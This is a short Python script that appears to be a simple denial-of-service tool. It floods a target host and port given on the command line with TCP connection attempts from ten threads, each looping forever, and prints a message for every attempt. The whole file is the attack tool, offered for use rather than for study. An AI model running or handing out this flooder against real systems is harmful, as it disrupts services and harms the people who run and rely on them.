#!/usr/bin/python3
# Please read the code. Do not use ctrl + c and ctrl + v (～￣▽￣)～

import os,sys,socket,threading
try:
    from colorama import Fore,init
    init()
except ImportError:
    os.system("pip install colorama")
end = '\033[0m'
def main():
    print()
    if sys.argv[1] == sys.argv[1]:
        host = sys.argv[1]
        port = int(sys.argv[2])
        def dos(d):
            while True:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect_ex((host,port))
                print(f"{Fore.RED}Packet Send To {Fore.GREEN}{host}{end}")
        for i in range(10):
            t = threading.Thread(target=dos,args=[i])
            t.start()
if __name__ == '__main__':
    try:
        main()
    except (KeyboardInterrupt,EOFError):
        print("Stop...")
        sys.exit()
